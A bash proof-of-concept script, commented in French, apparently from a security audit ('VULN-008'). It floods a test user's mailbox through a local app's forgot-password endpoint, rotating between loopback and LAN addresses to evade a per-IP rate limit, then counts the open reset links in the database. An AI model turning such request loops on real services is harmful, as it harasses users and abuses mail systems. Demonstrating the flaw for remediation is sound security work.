#!/usr/bin/env bash
# VULN-008 — PoC : inonder la boîte mail d'une victime via /auth/forgot-password
# Chaque requête crée un lien de reset valide et envoie un email. La limite n'est que par IP.
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
for host in "127.0.0.1" "[::1]" "$LAN_IP"; do
  [ -z "$host" ] && continue
  ok=0
  for i in $(seq 1 10); do
    code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://$host:3099/auth/forgot-password" \
      -H 'Content-Type: application/json' -d '{"email":"alice@corp.test"}')
    [ "$code" = "200" ] && ok=$((ok + 1))
  done
  echo "Depuis $host : $ok demandes acceptées (HTTP 200)"
done

ALICE_ID=$(sql "SELECT id FROM User WHERE email = 'alice@corp.test';")
echo
echo "\$ sqlite3 audit.db \"SELECT count(*) FROM PasswordReset WHERE userId = <alice> AND usedAt IS NULL AND expiresAt > now;\""
sql "SELECT count(*) FROM PasswordReset WHERE userId = $ALICE_ID AND usedAt IS NULL AND expiresAt > strftime('%s','now') * 1000;"
echo "(= emails de reset envoyés à Alice, et liens valides en même temps)"
